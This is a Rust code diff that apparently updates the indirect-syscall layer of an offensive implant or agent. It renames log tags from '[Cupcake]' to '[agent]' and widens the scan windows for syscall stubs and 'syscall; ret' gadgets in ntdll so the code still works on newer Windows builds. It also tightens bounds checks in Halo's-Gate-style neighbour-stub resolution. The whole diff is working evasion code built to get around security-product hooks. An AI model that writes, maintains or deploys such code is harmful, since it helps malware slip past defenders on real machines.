@@ -45,7 +45,7 @@ fn syscall_state() -> &'static Mutex<SyscallState> {
     static STATE: OnceLock<Mutex<SyscallState>> = OnceLock::new();
     STATE.get_or_init(|| {
         // Acceptance signal: no eager Nt* SSN scan at startup.
-        crate::utils::db_print("[Cupcake] syscall layer: lazy resolved 0 on init (SSN on-demand)");
+        crate::utils::db_print("[agent] syscall layer: lazy resolved 0 on init (SSN on-demand)");
         Mutex::new(SyscallState {
             ssn_cache: HashMap::new(),
             gadgets: Vec::with_capacity(MAX_GADGETS),
@@ -57,34 +57,42 @@ fn syscall_state() -> &'static Mutex<SyscallState> {
 static GADGET_RR: AtomicUsize = AtomicUsize::new(0);
 
 /// Extract SSN from a clean x64 syscall stub, if present.
+///
+/// Returns `(ssn, gadget)` where `gadget` is the address of the stub's own
+/// `syscall; ret` when present. Stub shapes seen in the wild:
+/// - short (hotpatch):  4C 8B D1 B8 XX XX XX XX 0F 05 C3          (gadget at +8)
+/// - standard (modern, incl. Win11 25H2+/build 26200):
+///   4C 8B D1 B8 XX XX XX XX F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E C3
+///   (gadget at +18). We scan the stub body instead of hardcoding one offset.
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn extract_ssn_from_stub(addr: usize) -> Option<(u16, usize)> {
     if addr == 0 {
         return None;
     }
-    let bytes = std::slice::from_raw_parts(addr as *const u8, 16);
+    let bytes = std::slice::from_raw_parts(addr as *const u8, 32);
+
+    // First `syscall; ret` inside the stub body (after the SSN dword).
+    let find_gadget = |b: &[u8]| -> usize {
+        let mut k = 8usize;
+        while k + 2 < b.len() {
+            if b[k] == 0x0F && b[k + 1] == 0x05 && b[k + 2] == 0xC3 {
+                return addr + k;
+            }
+            k += 1;
+        }
+        0
+    };
 
     // Pattern 1: 4C 8B D1 ; B8 XX XX XX XX  (mov r10, rcx; mov eax, SSN)
     if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
         let ssn = u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as u16;
-        // Prefer gadget at stub's own syscall;ret if present
-        let gadget = if bytes[8] == 0x0F && bytes[9] == 0x05 && bytes[10] == 0xC3 {
-            addr + 8
-        } else {
-            0
-        };
-        return Some((ssn, gadget));
+        return Some((ssn, find_gadget(bytes)));
     }
 
     // Pattern 2: B8 XX XX XX XX ; 4C 8B D1
     if bytes[0] == 0xB8 && bytes[5] == 0x4C && bytes[6] == 0x8B && bytes[7] == 0xD1 {
         let ssn = u32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]) as u16;
-        let gadget = if bytes[8] == 0x0F && bytes[9] == 0x05 && bytes[10] == 0xC3 {
-            addr + 8
-        } else {
-            0
-        };
-        return Some((ssn, gadget));
+        return Some((ssn, find_gadget(bytes)));
     }
 
     None
@@ -137,8 +145,13 @@ unsafe fn harvest_gadget_pool(state: &mut SyscallState) {
             continue;
         }
 
-        // Cap scan window to reduce anomalous full-section reads
-        let scan_len = size.min(0x20000);
+        // Cap scan window to reduce anomalous full-section reads. Modern
+        // ntdll (Win11 25H2+/build 26200) places syscall stubs far past the
+        // first 0x20000 of .text (observed: first 0F 05 C3 at ~0x15ebe2 in a
+        // 0x16937a-byte .text), so a 128KB window harvests nothing. ntdll is
+        // bounded (~2MB today), so a 4MB cap still keeps reads finite while
+        // covering every known layout.
+        let scan_len = size.min(0x400000);
         let mem = std::slice::from_raw_parts(addr as *const u8, scan_len);
         let mut j = 0;
         while j + 2 < scan_len && state.gadgets.len() < MAX_GADGETS {
@@ -153,10 +166,10 @@ unsafe fn harvest_gadget_pool(state: &mut SyscallState) {
     }
 
     if state.gadgets.is_empty() {
-        crate::utils::db_print("[Cupcake] Gadget pool empty after limited harvest");
+        crate::utils::db_print("[agent] Gadget pool empty after limited harvest");
     } else {
         crate::utils::db_print(&format!(
-            "[Cupcake] Gadget pool ready: {} entries",
+            "[agent] Gadget pool ready: {} entries",
             state.gadgets.len()
         ));
     }
@@ -221,7 +234,8 @@ unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
     for i in 1..=HALO_MAX_NEIGHBORS {
         for &stride in &[STUB_STRIDE, 0x10usize, 0x20usize] {
             let down = api_addr.wrapping_add(i * stride);
-            if down >= ntdll_end {
+            // extract reads 32 bytes — keep the whole probe inside ntdll
+            if down + 32 > ntdll_end {
                 break;
             }
             if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(down) {
@@ -237,7 +251,7 @@ unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
             }
 
             let up = api_addr.wrapping_sub(i * stride);
-            if up < ntdll_base {
+            if up < ntdll_base || up + 32 > ntdll_end {
                 continue;
             }
             if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(up) {
@@ -289,7 +303,7 @@ pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
         Some(s) => s,
         None => {
             crate::utils::db_print(&format!(
-                "[Cupcake] SSN not found for 0x{:X}, refusing hooked stub fallback",
+                "[agent] SSN not found for 0x{:X}, refusing hooked stub fallback",
                 hash
             ));
             return -1; // STATUS_UNSUCCESSFUL-ish
@@ -298,7 +312,7 @@ pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
 
     let gadget = pick_gadget();
     if gadget == 0 {
-        crate::utils::db_print("[Cupcake] No syscall gadget, refusing hooked stub fallback");
+        crate::utils::db_print("[agent] No syscall gadget, refusing hooked stub fallback");
         return -1;
     }
 
@@ -408,7 +422,7 @@ pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
     let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
     if api_addr == 0 {
         crate::utils::db_print(&format!(
-            "[Cupcake][x86] API not found for hash 0x{:X}",
+            "[agent][x86] API not found for hash 0x{:X}",
             hash
         ));
         return -1;
